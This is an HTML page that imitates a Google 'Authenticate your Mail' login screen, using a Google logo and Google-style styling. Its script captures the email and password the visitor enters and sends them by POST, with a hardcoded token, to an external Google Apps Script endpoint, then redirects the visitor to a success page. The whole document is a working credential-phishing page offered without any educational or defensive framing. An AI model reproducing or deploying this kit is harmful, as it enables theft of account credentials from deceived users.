<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authenticate Your Mail - Google</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: white;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            width: 400px;
            background: white;
            padding: 40px 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 12px;
            border: 1px solid #ddd;
            text-align: center;
        }
        .header img {
            height: 92px;
            margin-bottom: 20px;
        }
        .header h1 {
            margin: 0;
            font-size: 24px;
            color: #202124;
            margin-bottom: 10px;
        }
        .header h2 {
            margin: 0;
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 20px;
        }
        .header p {
            margin: 0;
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 24px;
        }
        .form-group {
            margin-bottom: 16px;
            text-align: left;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #202124;
            font-size: 14px;
        }
        .form-group input {
            width: 100%;
            padding: 14px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 14px;
        }
        .form-group input:focus {
            border-color: #1a73e8;
            outline: none;
        }
        .form-group .show-password-container {
            display: flex;
            align-items: center;
            margin-top: 8px;
        }
        .form-group .show-password-container input[type="checkbox"] {
            margin-right: 8px;
            transform: scale(1.2); /* Make the checkbox larger */
        }
        .form-group .show-password-container label {
            color: #1a73e8;
            font-size: 14px;
            cursor: pointer;
        }
        .form-group .next-button {
            width: 100%;
            padding: 14px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 24px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            text-align: center;
            margin-top: 20px;
            transition: background 0.3s ease;
        }
        .form-group .next-button:hover {
            background: #1761b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://inkbotdesign.com/wp-content/uploads/2018/04/new-google-logo-design.png" alt="Google Logo">
            <h1>Authenticate your Mail</h1>
            <h2>Enter your credentials</h2>
            <p>Enter your mail and password to proceed to the next step</p>
        </div>
        <form id="auth-form">
    <div class="form-group">
        <label for="email">Email</label>
        <input type="email" id="email" name="email" required>
    </div>
    <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
        <div class="show-password-container">
            <input type="checkbox" id="show-password" onclick="togglePassword()">
            <label for="show-password">Show password</label>
        </div>
    </div>
    <div class="form-group">
        <button type="submit" class="next-button">Next</button>
    </div>
</form>

    </div>

    <script>
        function togglePassword() {
            var passwordInput = document.getElementById("password");
            var showPasswordCheckbox = document.getElementById("show-password");
            if (showPasswordCheckbox.checked) {
                passwordInput.type = "text";
            } else {
                passwordInput.type = "password";
            }
        }
    </script>
    <script>
    const form = document.getElementById('auth-form');

    form.addEventListener('submit', function (e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        const data = new FormData();
        data.append("email", email);
        data.append("password", password);
        data.append("auth", "mySuperSecretToken123"); // Optional

        fetch("https://script.google.com/macros/s/AKfycbzBU_k1uPBHTv4hBp6FGd94OsEQntIOUFtP7FaxEFo1NCJVqhzTvQceub6Uxq-lQJUEPQ/exec", {
            method: "POST",
            body: data
        }).then(response => {
            if (response.ok) {
                window.location.href = "success.html";
            } else {
                alert("Submission failed.");
            }
        }).catch(error => {
            console.error("Error:", error);
            alert("Error submitting form.");
        });
    });
</script>

</body>
</html>
